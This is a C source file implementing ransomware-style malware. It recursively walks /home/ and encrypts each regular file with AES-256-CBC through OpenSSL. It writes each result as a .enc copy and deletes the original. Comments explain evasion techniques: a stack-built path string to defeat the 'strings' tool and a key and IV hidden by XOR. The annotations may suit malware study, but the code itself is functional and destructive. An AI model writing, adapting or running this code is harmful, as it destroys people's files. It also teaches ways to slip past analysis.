#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

// Function Prototypes
void encryptfile(FILE * fpin, FILE* fpout, unsigned char* key, unsigned char* iv);
void ls_dir(char* start_path);

int main() {
    // STACK STRING: Building "/home/" char by char to hide it from 'strings' command
    char p[7];
    p[0]='/'; p[1]='h'; p[2]='o'; p[3]='m'; p[4]='e'; p[5]='/'; p[6]='\0';
    
    ls_dir(p); // Start the recursive directory search
    return 0;
}

void ls_dir(char* start_path) {
    unsigned char key[33];
    unsigned char iv[17];
    
    // OBFUSCATED DATA: These hex values are the key/iv XORed with 0x55
    unsigned char m_key[] = {0x64, 0x67, 0x66, 0x61, 0x60, 0x63, 0x62, 0x6d, 0x6c, 0x65, 0x64, 0x67, 0x66, 0x61, 0x60, 0x63, 0x64, 0x67, 0x66, 0x61, 0x60, 0x63, 0x62, 0x6d, 0x6c, 0x65, 0x64, 0x67, 0x66, 0x61, 0x60, 0x63};
    unsigned char m_iv[]  = {0x64, 0x67, 0x66, 0x61, 0x60, 0x63, 0x62, 0x6d, 0x6c, 0x65, 0x64, 0x67, 0x66, 0x61, 0x60, 0x63};
    
    // DE-OBFUSCATION: Restore the actual key/iv in RAM only when needed
    for(int i=0; i<32; i++) key[i] = m_key[i] ^ 0x55;
    for(int i=0; i<16; i++) iv[i] = m_iv[i] ^ 0x55;

    DIR* dir;
    struct dirent *ent;
    
    // Open the directory specified in start_path
    if((dir = opendir(start_path)) != NULL) {
        while((ent = readdir(dir)) != NULL) {
            // Check if entry is a regular file (DT_REG = 8)
            if(ent->d_type == 8) {
                // Skip files that already have the .enc extension
                if(strstr(ent->d_name, ".enc") == NULL) {
                    // Build the full source path
                    char* full_path = malloc(strlen(start_path) + strlen(ent->d_name) + 1);
                    sprintf(full_path, "%s%s", start_path, ent->d_name);

                    // Build the destination path (source + .enc)
                    char* new_name = malloc(strlen(full_path) + 5);
                    sprintf(new_name, "%s.enc", full_path);

                    FILE *fpin = fopen(full_path, "rb"); // Open original in Read Binary
                    FILE *fpout = fopen(new_name, "wb"); // Open target in Write Binary
                    
                    if(fpin && fpout) {
                        encryptfile(fpin, fpout, key, iv); // Perform AES encryption
                        fclose(fpin);
                        fclose(fpout);
                        remove(full_path); // DELETE the original unencrypted file
                    }
                    free(full_path);
                    free(new_name);
                }
            } 
            // Check if entry is a directory (DT_DIR = 4) and not "." or ".."
            else if(ent->d_type == 4 && ent->d_name[0] != '.') {
                char *next_path = malloc(strlen(start_path) + strlen(ent->d_name) + 2);
                sprintf(next_path, "%s%s/", start_path, ent->d_name);
                ls_dir(next_path); // RECURSION: Go deeper into the folder
                free(next_path);
            }
        }
        closedir(dir);
    }
}

void encryptfile(FILE * fpin, FILE* fpout, unsigned char* key, unsigned char* iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); // Create OpenSSL context
    
    // Initialize Encryption: AES-256-CBC mode, 1 = Encrypt
    EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);
    
    unsigned char inbuf[4096], outbuf[4096 + 16];
    int len, outlen;
    
    // Read file in 4KB chunks
    while((len = fread(inbuf, 1, 4096, fpin)) > 0) {
        EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, len); // Encrypt chunk
        fwrite(outbuf, 1, outlen, fpout); // Write encrypted chunk to file
    }
    
    EVP_CipherFinal_ex(ctx, outbuf, &outlen); // Handle final block padding
    fwrite(outbuf, 1, outlen, fpout);
    
    EVP_CIPHER_CTX_free(ctx); // Free OpenSSL memory
}
